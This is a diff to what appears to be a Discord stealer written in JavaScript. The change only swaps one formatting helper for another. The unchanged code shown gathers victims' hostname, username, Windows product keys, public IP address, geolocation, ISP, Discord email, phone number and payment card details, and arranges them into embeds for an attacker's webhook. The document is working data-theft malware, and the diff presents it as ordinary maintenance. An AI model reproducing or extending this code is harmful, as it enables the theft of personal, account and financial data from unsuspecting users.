@@ -1,5 +1,5 @@
 const { webhook } = require('../config');
-const { isValidURL, codeBlock } = require('../util/string');
+const { isValidURL, codeBlock, code } = require('../util/string');
 const axios = require('axios');
 const { join, sep } = require('path');
 const os = require('os');
@@ -17,17 +17,17 @@ const json = async (zipFile) => {
   const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString());
   const computerInfoFields = [
     ['RAM', Math.floor(os.totalmem() / 1024 / 1024 / 1024) + 'GB'],
-    ['Name', codeBlock(os.hostname())],
+    ['Name', code(os.hostname())],
     ['⏲️ Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
-    ['🥷 Username', codeBlock(os.userInfo().username)],
+    ['🥷 Username', code(os.userInfo().username)],
     ['OS version', os.version()],
-    ['Product Key', codeBlock(require('./product-key').productKey)],
-    ['Backup Product Key', codeBlock(require('./product-key').backupProductKey)],
+    ['Product Key', code(require('./product-key').productKey)],
+    ['Backup Product Key', code(require('./product-key').backupProductKey)],
   ];
   const ipInfoFields = [
-    ['IP Address', `[${codeBlock(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
-    ['🗺️ Location', `[${codeBlock(await ipInfo('lat') + ', ' + await ipInfo('lon'))}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
-    ['ISP', codeBlock(await ipInfo('isp'))],
+    ['IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
+    ['🗺️ Location', `[${code(await ipInfo('lat') + ', ' + await ipInfo('lon'))}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
+    ['ISP', code(await ipInfo('isp'))],
   ];
 
   const embeds = [
@@ -52,8 +52,8 @@ const json = async (zipFile) => {
       ['🌍 Locale', codeBlock(account.locale)],
       ['🔞 NSFW Allowed', account.nsfw_allowed],
       ['🔐 MFA Enabled', account.mfa_enabled],
-      ['✉️ Email', account.email ? codeBlock(account.email) : 'No Email'],
-      ['📞 Phone Number', account.phone ? codeBlock(account.phone) : 'No Phone Number'],
+      ['✉️ Email', account.email ? code(account.email) : 'No Email'],
+      ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
       ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type)],
       ['Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
     ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
@@ -65,13 +65,13 @@ const json = async (zipFile) => {
       ['Default', billing.default],
       ['Name', billing.billing_address.name],
       ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
-      ['Ends in', codeBlock(billing.last_4)],
+      ['Ends in', code(billing.last_4)],
       ['Brand', billing.brand],
-      ['Expires in', codeBlock(billing.expires_month + '/' + billing.expires_year)]
+      ['Expires in', code(billing.expires_month + '/' + billing.expires_year)]
     ] : [
       ['Default', billing.default],
       ['Name', billing.billing_address.name],
-      ['✉️ Email', codeBlock(billing.email)],
+      ['✉️ Email', code(billing.email)],
       ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
     ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
   }); }) : embeds.push({
